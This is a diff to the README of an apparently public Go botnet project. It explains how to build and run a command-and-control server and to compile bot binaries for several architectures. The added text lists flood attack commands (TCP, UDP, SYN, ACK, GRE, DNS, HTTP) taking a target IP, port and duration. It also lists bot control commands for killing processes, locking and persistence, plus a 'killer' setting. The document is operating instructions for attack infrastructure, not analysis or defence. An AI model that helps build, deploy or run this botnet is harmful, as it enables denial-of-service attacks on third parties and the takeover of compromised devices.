@@ -18,10 +18,11 @@ This project implements a simple Botnet Control and Command (CnC) server in Go, 
 1. **Clone the repository**:
    ```bash
    git clone https://github.com/Birdo1221/BotnetGo.git
-   cd BotnetGo
+   cd BotnetGo/cnc
    ```
 
 2. **Install dependencies**:
+
    ```bash
    go mod tidy
    ```
@@ -33,34 +34,73 @@ This project implements a simple Botnet Control and Command (CnC) server in Go, 
    go mod tidy
    ```
 
-4. **Build the project**:
+3. **Build the project**:
+   
    ```bash
-   go build -o botnet
+   go build -o cnc *.go
    ```
 
-5. **Run the server**:
-   ```bash
-   ./botnet
-   ```
-6. **Running the Device / Bot files**:
-   You bascially want to enter into the ```dir Devices``` Directory
-   ```bash
+4. **Run the server**:
+   If the any of the ports are defined below 1024,
+   you will need to run with sudo privilages to bind to that port
    
+   ```bash
+   ./cnc
+   ```
+   
+5. **Running the Device / Bot files**:
+   You bascially want to enter into the ```bash Devices``` Directory
+   and do the exact same you did in the CNC directory
+   ```bash
+   cd ../device
+   go mod tidy
+   ```
+   If you are experiencing errors / issues or just 
+   want to reinstall to redo the Mod files just do:
+   
+   ```bash
+   go mod init cnc
+   go mod tidy
+   ```
+   Then to build just run the build.sh script to make all the different arch types,
+   but if you just want to build it for standard x86 or just without defining anything just run
+
+    ```bash
+    sh build.sh
+   ```
+    For without defining
+    ```bash
+     go build -o Botfile bot.go
    ```
 
 ## Configuration
 Edit the constants in `main.go` to configure:
 - **User and Bot Server IPs**: Adjust `USER_SERVER_IP` and `BOT_SERVER_IP`.
 - **Server Ports**: Modify `USER_SERVER_PORT` and `BOT_SERVER_PORT`.
+- **Killer**: Modify `killerEnabled` to `true` if you want to run on runtime and not when commanded to.
 
 ## Usage
 - Start the server and connect your bots.
 - Use the CLI to log in and execute commands.
   ### e.g. Termum, Mobaxterm or Putty
-- Example command to start an attack:
+- Attacks command to start an attack:
   ```bash
   !tcpflood <target_ip> <target_port> <duration>
+  !udpflood <target_ip> <target_port> <duration>
+  !udpsmart <target_ip> <target_port> <duration>
+  !syn <target_ip> <target_port> <duration>
+  !ack <target_ip> <target_port> <duration>
+  !gre <target_ip> <duration> // you will need to send a port anyway
+  !dns <target_ip> <target_port> <duration>
+  !http <target_ip> <target_port> <duration> // still in the works
   ```
+- Alternative command to send:
+  ```bash
+  !kill
+  !lock
+  !persist
+  ```
+
 
   ## Logging in 
 1. **How to Login**:
